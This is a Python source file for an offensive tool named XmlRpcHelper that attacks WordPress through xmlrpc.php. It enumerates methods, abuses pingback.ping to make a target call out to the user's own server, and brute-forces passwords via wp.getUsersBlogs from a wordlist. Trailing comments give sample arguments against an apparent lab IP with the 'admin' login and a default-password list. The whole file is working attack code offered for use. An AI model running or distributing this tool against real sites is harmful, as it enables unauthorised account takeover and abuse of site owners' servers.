import argparse
from typing import List, AnyStr
from XmlRpcRequest import XmlRpcRequest


def readWordlist(path_to_file) -> List[str]:
    try:
        return [passwd.rstrip('\n') for passwd in open(path_to_file, 'r').readlines()]
    except FileNotFoundError as e:
        print(f'[!] Error: {e.strerror}')
        exit(-1)

def selectScriptMode(args) -> None:
    url = args.u
    method = args.mode

    xmlRpcRequest = XmlRpcRequest(url=url, method=method)


    '''
        This mode start pingback mode
    '''
    if method == 'pingback.ping':
        src = args.s
        dst = args.d

        response = xmlRpcRequest.sendRequest(first_param=src, second_param=dst)
        print(response)


    elif method == 'wp.getUsersBlogs':
        login = args.l

        pass_wordlist_path = args.p
        pass_wordlist = readWordlist(pass_wordlist_path)

        for passwd in pass_wordlist:
            response = xmlRpcRequest.sendRequest(first_param=login, second_param=passwd)
            validation_response = xmlRpcRequest.isInvalidCreds(response)

            if validation_response is True:
                print(f'[+] Gotcha!!! The password if \'{passwd}\'')
                break

            print(f'[-] Nope! Not this password \'{passwd}\'')


    else:
        response = xmlRpcRequest.sendRequest()
        print(response)


if __name__ == '__main__':
    mode = ''

    argumentParser = argparse.ArgumentParser(
        prog='XmlRpcHelper',
        usage='''./XmlPrcHelper.py MODE {AllMethods | Ping | Bruting} -u URL
            Mods details (Select one of those methods and '--help' to get more information about options):
            1. pingback.ping        - This method allow you to ping back on our server, you can use netcat, 
                                      nodejs, python server or other ways. All what you need just set source 
                                      and destination addresses;
            2. wp.getUsersBlogs     - This method may help you get access to Wordpress by bruting creds;
            3. system.listMethods   - This method allow to get all accessible methods from Wordpress CMS.
        ''',
        description='''
            This simple python script automate process of extrating information or getting access by xmlrpc
        ''',
        add_help=True,
        allow_abbrev=True
    )

    subArgumentParser = argumentParser.add_subparsers(title='Script Mods', dest=mode)
    ping    = subArgumentParser.add_parser('pingback.ping', help='ping back feature')
    brute   = subArgumentParser.add_parser('wp.getUsersBlogs', help='brute force creds')
    list    = subArgumentParser.add_parser('system.listMethods', help='get all accessible methods')

    list.add_argument('-u', type=str, required=True, metavar='--url', help='Specify url address')

    ping.add_argument('-s', type=str, required=True, metavar='--src', help='Specify source address (it\'s your server)')
    ping.add_argument('-d', type=str, required=True, metavar='--dst', help='Specify destination address (it\'s target server)')
    ping.add_argument('-u', type=str, required=True, metavar='--url', help='Specify url address')

    brute.add_argument('-l', type=str, required=False, metavar='--login', help='Specify login')
    brute.add_argument('-p', type=str, required=False, metavar='--pass-wordlist', help='Specify path to wordlist')
    brute.add_argument('-u', type=str, required=True, metavar='--url', help='Specify url address')

    ping.set_defaults(mode='pingback.ping')
    brute.set_defaults(mode='wp.getUsersBlogs')
    list.set_defaults(mode='system.listMethods')

    arguments = argumentParser.parse_args()
    selectScriptMode(args=arguments)



# -l
# admin
# -p
# /Users/breadrock/Instruments/SecLists/Passwords/cirt-default-passwords.txt
# -u
# http://10.129.79.114/xmlrpc.php